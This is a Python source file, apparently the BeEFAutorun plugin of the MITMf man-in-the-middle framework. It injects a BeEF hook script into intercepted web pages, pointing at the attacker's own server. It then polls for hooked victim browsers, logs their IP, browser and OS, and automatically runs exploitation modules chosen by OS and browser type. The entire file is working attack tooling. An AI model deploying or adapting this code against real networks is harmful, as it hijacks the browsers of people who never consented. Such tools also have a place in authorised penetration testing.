#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import sys
import json
import threading

from core.beefapi.beefapi import BeefAPI
from plugins.plugin import Plugin
from plugins.Inject import Inject
from time import sleep

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)

mitmf_logger = logging.getLogger('mitmf')

class BeefAutorun(Inject, Plugin):
	name     = "BeEFAutorun"
	optname  = "beefauto"
	desc     = "Injects BeEF hooks & autoruns modules based on Browser and/or OS type"
	depends  = ["Inject"]
	version  = "0.3"
	req_root = False
	has_opts = False

	def initialize(self, options):
		self.options = options
		self.ip_address = options.ip_address

		try:
			beefconfig = options.configfile['MITMf']['BeEF']
		except Exception, e:
			sys.exit("[-] Error parsing BeEF options in config file: " + str(e))
		
		try:
			userconfig = options.configfile['BeEFAutorun']
		except Exception, e:
			sys.exit("[-] Error parsing config for BeEFAutorun: " + str(e))
		
		self.Mode = userconfig['mode']
		self.All_modules = userconfig["ALL"]
		self.Targeted_modules = userconfig["targets"]

		Inject.initialize(self, options)
		self.black_ips = []
		self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.ip_address, beefconfig['beefport'])
		
		beef = BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
		if not beef.login(beefconfig['user'], beefconfig['pass']):
			sys.exit("[-] Error logging in to BeEF!")

		self.output.append("Mode: %s" % self.Mode)

		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
		t.setDaemon(True)
		t.start()

	def autorun(self, beef):
		already_ran    = []
		already_hooked = []

		while True:
			sessions = beef.sessions_online()
			if (sessions is not None and len(sessions) > 0):
				for session in sessions:

					if session not in already_hooked:
						info = beef.hook_info(session)
						mitmf_logger.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
						already_hooked.append(session)
						self.black_ips.append(str(info['ip']))

					if self.Mode == 'oneshot':
						if session not in already_ran:
							self.execModules(session, beef)
							already_ran.append(session)

					elif self.Mode == 'loop':
						self.execModules(session, beef)
						sleep(10)

			else:
				sleep(1)

	def execModules(self, session, beef):
		session_info = beef.hook_info(session)
		session_ip   = session_info['ip']
		hook_browser = session_info['name']
		hook_os      = session_info['os']

		if len(self.All_modules) > 0:
			mitmf_logger.info("%s >> sending generic modules" % session_ip)
			for module, options in self.All_modules.iteritems():
				mod_id = beef.module_id(module)
				resp = beef.module_run(session, mod_id, json.loads(options))
				if resp["success"] == 'true':
					mitmf_logger.info('%s >> sent module %s' % (session_ip, mod_id))
				else:
					mitmf_logger.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
				sleep(0.5)

		mitmf_logger.info("%s >> sending targeted modules" % session_ip)
		for os in self.Targeted_modules:
			if (os in hook_os) or (os == hook_os):
				browsers = self.Targeted_modules[os]
				if len(browsers) > 0:
					for browser in browsers:
						if browser == hook_browser:
							modules = self.Targeted_modules[os][browser]
							if len(modules) > 0:
								for module, options in modules.iteritems():
									mod_id = beef.module_id(module)
									resp = beef.module_run(session, mod_id, json.loads(options))
									if resp["success"] == 'true':
										mitmf_logger.info('%s >> sent module %s' % (session_ip, mod_id))
									else:
										mitmf_logger.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
									sleep(0.5)
